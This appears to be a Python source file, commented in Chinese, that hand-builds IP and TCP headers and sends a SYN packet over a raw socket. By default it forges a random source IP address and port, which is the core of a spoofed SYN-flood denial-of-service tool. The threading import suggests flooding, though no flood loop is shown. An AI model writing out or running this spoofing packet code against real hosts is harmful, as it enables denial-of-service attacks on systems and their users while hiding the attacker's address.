import threading
import struct
import socket
import random
import sys

def create_radnom_ipv4_addr():
    return '.'.join([f'{random.randint(0x00, 0xff)}' for _ in range(4)])

def send_syn(source_addr :str = None, source_port :int = None, target_addr :str = None, target_port :int = None):
    if not source_addr:
        source_addr = create_radnom_ipv4_addr()
    if not source_port:
        source_port = random.randint(0x0001, 0xffff)

    # IP头部
    ip_header = struct.pack(
        '!BBHHHBBH4s4s', # 格式字符串，表示使用大端字节序，每个字符表示一个字节
        0x45,    # 版本和首部长度，4位版本号为4，4位首部长度为5，合并为0x45
        0x00,    # 服务类型，一般为0
        0x0028,  # 总长度，IP头部20字节，TCP头部20字节，数据部分0字节，合并为0x0028
        0x0000,  # 标识符，一般为0
        0x4000,  # 标志和片偏移，3位标志为010，表示不分片，13位片偏移为0，合并为0x4000
        0x40,    # 生存时间，一般为64
        0x06,    # 协议，TCP协议为6
        0x0000,  # 校验和，一般为0，由操作系统自动计算
        socket.inet_aton(source_addr), # 源IP地址，使用inet_aton函数将点分十进制转换为二进制
        socket.inet_aton(target_addr)  # 目的IP地址，使用inet_aton函数将点分十进制转换为二进制
    )

    # TCP头部
    tcp_header = struct.pack(
        '!HHLLBBHHH', # 格式字符串，表示使用大端字节序，每个字符表示一个字节
        source_port,  # 源端口
        target_port,  # 目的端口
        0x00000000,   # 序列号，一般为0
        0x00000000,   # 确认号，一般为0
        0x50,   # 数据偏移和保留位，4位数据偏移为5，4位保留位为0，合并为0x50
        0x02,   # 控制位，SYN标志为1，表示发起连接，其他标志为0，合并为0x02
        0x0000, # 窗口大小，一般为0
        0x0000, # 校验和，一般为0，由操作系统自动计算
        0x0000  # 紧急指针，一般为0
    )

    # 数据部分
    # data = b'' # 数据部分为空
    # 数据包
    packet = ip_header + tcp_header

    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    raw_socket.sendto(packet, (target_addr, target_port))
    raw_socket.close()

